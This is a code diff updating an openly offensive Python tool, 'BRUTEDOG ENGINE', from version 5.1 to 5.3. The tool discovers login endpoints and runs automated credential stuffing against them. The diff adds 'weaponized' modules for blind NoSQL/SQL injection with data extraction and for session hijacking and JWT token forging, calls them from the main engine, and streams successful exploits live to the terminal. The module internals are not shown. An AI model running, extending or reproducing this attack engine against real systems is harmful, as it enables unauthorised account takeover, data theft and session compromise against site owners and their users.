@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v5.1 — High-Aggression Authentication & Credential Stuffing Engine
+BRUTEDOG ENGINE v5.3 — High-Aggression Authentication & Offensive Exploitation Engine
 Features:
 - Interactive target selection & automated resolution
 - Automated credential stuffing and password harvesting loops
-- High-aggression login bypass and brute-force probing
-- SQL/NoSQL error detection & differential input testing
+- Aggressive NoSQL/SQL time-based blind injection & data extraction
+- Advanced session hijacking, JWT cracking, and cookie privilege escalation
 - Session-cookie security inspection
 - Bounded concurrency with asyncio
-- Live terminal streaming of successful auth cracks
+- Live terminal streaming of successful exploits
 - No report files, in-memory findings
 """
 import asyncio
@@ -22,13 +22,17 @@ import time
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
+# Import new weaponized offensive modules
+from modules.db_assault import run_nosql_assault
+from modules.session_hijack import run_session_hijack
+
 # ============================================================
 # CONFIGURATION
 # ============================================================
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/5.1"
+USER_AGENT = "BruteDog-Offensive-Engine/5.3"
 
 LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -263,9 +267,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
     info(f"Targeting endpoint: {endpoint}")
     results = []
     
-    # Construct active test payloads (Credential Stuffing + Injection Probes)
     test_cases = []
-    
     if credentials_list and isinstance(credentials_list, list):
         for cred in credentials_list:
             if isinstance(cred, dict):
@@ -280,7 +282,6 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
                     "payload": {"username": u, "password": p}
                 })
     
-    # Default aggressive payloads if list is empty or sparse
     if not test_cases:
         test_cases = [
             {
@@ -318,7 +319,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
     return results
 
 # ============================================================
-# ENGINE ORCHESTRATOR
+# ENGINE ORCHESTRATOR (UPDATED WITH DB ASSAULT & SESSION HIJACK)
 # ============================================================
 async def run_autonomous_engine(
     target_host=None,
@@ -326,12 +327,9 @@ async def run_autonomous_engine(
     options=None,
 ):
     """
-    Active Authentication & Credential Stuffing Engine
-    - Discovers login endpoints
-    - Dispatches automated credential stuffing and injection attacks
-    - Streams successful logins and session tokens live to terminal
+    Active Authentication, Credential Stuffing & Exploitation Engine
     """
-    section("BRUTEDOG ACTIVE AUTHENTICATION & STUFFING ENGINE")
+    section("BRUTEDOG ACTIVE OFFENSIVE ASSAULT ENGINE v5.3")
     try:
         if target_host:
             target = target_host.strip()
@@ -365,8 +363,9 @@ async def run_autonomous_engine(
         success(f"Resolved: {address}")
         
     start = time.monotonic()
+    target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
     
-    # Endpoint & Stuffing Execution
+    # 1. Authentication Endpoint Testing & Credential Stuffing
     section("AUTHENTICATION ENDPOINT TESTING & CREDENTIAL STUFFING")
     all_results = []
     semaphore = asyncio.Semaphore(MAX_WORKERS)
@@ -395,6 +394,22 @@ async def run_autonomous_engine(
                 all_results.extend(results)
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
+
+    # 2. Aggressive Database Exploitation & Blind Injection
+    try:
+        db_findings = await run_nosql_assault(target_url, port=port, use_ssl=secure)
+        if db_findings:
+            success(f"Database Assault uncovered {len(db_findings)} active vectors.")
+    except Exception as exc:
+        error(f"Database assault module execution failed: {exc}")
+
+    # 3. Advanced Session Hijacking & Token Forging
+    try:
+        session_findings = await run_session_hijack(target_url, port=port, use_ssl=secure)
+        if session_findings:
+            success(f"Session Hijack module prepared {len(session_findings)} token vectors.")
+    except Exception as exc:
+        error(f"Session hijack module execution failed: {exc}")
             
     duration = round(time.monotonic() - start, 2)
     
